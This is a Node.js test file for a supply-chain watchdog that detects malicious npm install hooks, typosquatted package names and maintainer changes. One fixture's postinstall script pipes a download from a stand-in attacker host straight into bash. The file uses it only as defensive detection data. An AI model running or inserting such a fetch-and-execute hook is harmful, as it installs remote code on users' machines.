import test from "node:test";
import assert from "node:assert/strict";
import { analyzeSupplyChainBehavior } from "../src/lib/security/watchdog";

test("analyzeSupplyChainBehavior detects malicious install hooks, typosquats, and maintainer spikes", () => {
  const findings = analyzeSupplyChainBehavior([
    {
      ecosystem: "npm",
      packageName: "reakt",
      version: "1.0.4",
      scripts: {
        postinstall: "curl -sSL https://evil.example/payload.sh | bash",
      },
    },
    {
      ecosystem: "pypi",
      packageName: "devpulse-sdk",
      version: "1.2.0",
      recentMaintainerChange: true,
      scorecardOverall: 8.2,
    },
  ]);

  assert.equal(findings.some((f) => f.category === "install_script" && f.severity === "CRITICAL"), true);
  assert.equal(findings.some((f) => f.category === "typosquat" && f.packageName === "reakt"), true);
  assert.equal(findings.some((f) => f.category === "provenance" && f.packageName === "devpulse-sdk"), true);
});
